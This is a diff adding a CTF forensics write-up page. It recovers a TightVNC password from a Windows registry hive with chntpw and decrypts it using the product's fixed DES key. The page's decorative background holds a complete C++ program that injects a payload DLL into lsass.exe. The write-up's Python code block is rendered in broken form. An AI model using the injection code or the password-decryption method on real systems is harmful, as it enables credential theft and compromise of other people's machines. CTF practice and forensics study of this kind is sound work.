@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ImaginaryCTF Forensic - obsuct</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="ImaginaryCTF Forensic - obsuct" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>ImaginaryCTF Forensic - obsuct</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <hr />
+
+<h2 id="objective"><strong>Objective</strong></h2>
+<p>We are provided with a challenge file named <code class="language-plaintext highlighter-rouge">objective I installed.txt</code>, which contains the following hint:</p>
+
+<p>objective: I installed every old software known to man…
+The flag is the VNC password, wrapped in ictf{}.</p>
+
+<p>attachment: /assets/img/ctf_assets/Users.zip</p>
+
+<p>The goal is to <strong>recover the VNC password</strong> and submit it in the format <code class="language-plaintext highlighter-rouge">ictf{password}</code>.</p>
+
+<hr />
+
+<h2 id="initial-analysis"><strong>Initial Analysis</strong></h2>
+
+<p>The given file structure looks like a <strong>Windows file system</strong> dump.<br />
+This strongly suggests that sensitive user data, such as <strong>VNC configurations or registry values</strong>, might be stored inside files like <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code>.</p>
+
+<hr />
+
+<h3 id="exploring-the-directory"><strong>Exploring the Directory</strong></h3>
+<p>We begin by navigating through the file structure:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Users
+<span class="nb">ls</span>
+<span class="c"># Output:</span>
+rumi
+</code></pre></div></div>
+<p>Inside the rumi user folder:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>rumi
+<span class="nb">ls</span>
+</code></pre></div></div>
+<p>We notice several Windows-related files, including:</p>
+
+<ul>
+  <li>
+    <p>NTUSER.DAT</p>
+  </li>
+  <li>
+    <p>ntuser.dat.LOG1</p>
+  </li>
+  <li>
+    <p>ntuser.dat.LOG2</p>
+  </li>
+</ul>
+
+<p>Other typical Windows directories like AppData, Documents, Downloads, etc.</p>
+
+<p>The presence of NTUSER.DAT is a major clue, as this file stores user-specific registry data.</p>
+
+<h2 id="determining-the-vnc-software">Determining the VNC Software</h2>
+<p>The hint mentions “every old software known to man”.
+From this, we infer that the challenge involves older VNC software, such as:</p>
+
+<ul>
+  <li>
+    <p>TightVNC</p>
+  </li>
+  <li>
+    <p>UltraVNC</p>
+  </li>
+</ul>
+
+<p>To determine which one is installed, we search for VNC traces:
+The VNC password for TightVNC is stored in the Windows registry under the following key:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Software<span class="se">\T</span>ightVNC<span class="se">\S</span>erver<span class="se">\P</span>assword
+</code></pre></div></div>
+<p>We use chntpw (a registry hive editor) to explore NTUSER.DAT:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chntpw <span class="nt">-e</span> NTUSER.DAT
+</code></pre></div></div>
+<h3 id="navigating-the-registry">Navigating the Registry</h3>
+
+<ol>
+  <li>List root keys:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">ls</span>
+</code></pre></div>    </div>
+    <p>We find several keys, including <Software>.</Software></p>
+  </li>
+  <li>Navigate to Software:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cd </span>Software
+<span class="o">&gt;</span> <span class="nb">ls</span>
+</code></pre></div>    </div>
+    <p>Here we see <TightVNC>.</TightVNC></p>
+  </li>
+  <li>Dive into TightVNC &gt; Server:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cd </span>TightVNC
+<span class="o">&gt;</span> <span class="nb">cd </span>Server
+<span class="o">&gt;</span> <span class="nb">ls</span>
+</code></pre></div>    </div>
+    <p>Output snippet:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8  3 REG_BINARY         &lt;Password&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>Extract the Password:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cat </span>Password
+</code></pre></div>    </div>
+    <p>Output:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Value &lt;Password&gt; of <span class="nb">type </span>REG_BINARY <span class="o">(</span>3<span class="o">)</span>, data length 8 <span class="o">[</span>0x8]
+:00000  7E 9B 31 12 48 B7 C8 A8                         ~.1.H...
+</code></pre></div>    </div>
+    <p>The encrypted password is:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7E 9B 31 12 48 B7 C8 A8
+</code></pre></div>    </div>
+    <h2 id="decrypting-the-tightvnc-password">Decrypting the TightVNC Password</h2>
+    <p>TightVNC uses a fixed DES key to encrypt its password.
+Credit to the following GitHub gist for the decryption method:
+https://gist.github.com/jborean93/6168da85e5b3742d943300dd1176a63d
+We create a custom script dec.py to automate this decryption:
+```python
+#!/usr/bin/env python3</p>
+    <h1 id="tightvnc-password-decryptor-for-linux">TightVNC password decryptor for Linux</h1>
+    <h1 id="credit-httpsgistgithubcomjborean936168da85e5b3742d943300dd1176a63d">Credit: https://gist.github.com/jborean93/6168da85e5b3742d943300dd1176a63d</h1>
+  </li>
+</ol>
+
+<p>from Crypto.Cipher import DES</p>
+
+<h1 id="encrypted-8-byte-password-from-ntuserdat">Encrypted 8-byte password from NTUSER.DAT</h1>
+<p>encrypted_bytes = bytes([0x7E, 0x9B, 0x31, 0x12, 0x48, 0xB7, 0xC8, 0xA8])</p>
+
+<h1 id="tightvnc-fixed-des-key">TightVNC fixed DES key</h1>
+<p>magic_key = bytes([0xE8, 0x4A, 0xD6, 0x60, 0xC4, 0x72, 0x1A, 0xE0])</p>
+
+<h1 id="create-des-decryptor">Create DES decryptor</h1>
+<p>cipher = DES.new(magic_key, DES.MODE_ECB)</p>
+
+<h1 id="decrypt">Decrypt</h1>
+<p>password_bytes = cipher.decrypt(encrypted_bytes)</p>
+
+<h1 id="convert-to-string-and-remove-null-bytes">Convert to string and remove null bytes</h1>
+<p>password = password_bytes.decode(‘latin-1’).rstrip(‘\x00’)</p>
+
+<p>print(“TightVNC password:”, password)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Run the script:
+```bash
+python3 dec.py
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TightVNC password: cheeseburger
+</code></pre></div></div>
+<hr />
+<h2 id="final-flag">Final Flag</h2>
+<p>The challenge asks us to wrap the password in ictf{} format:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ictf<span class="o">{</span>cheeseburger<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
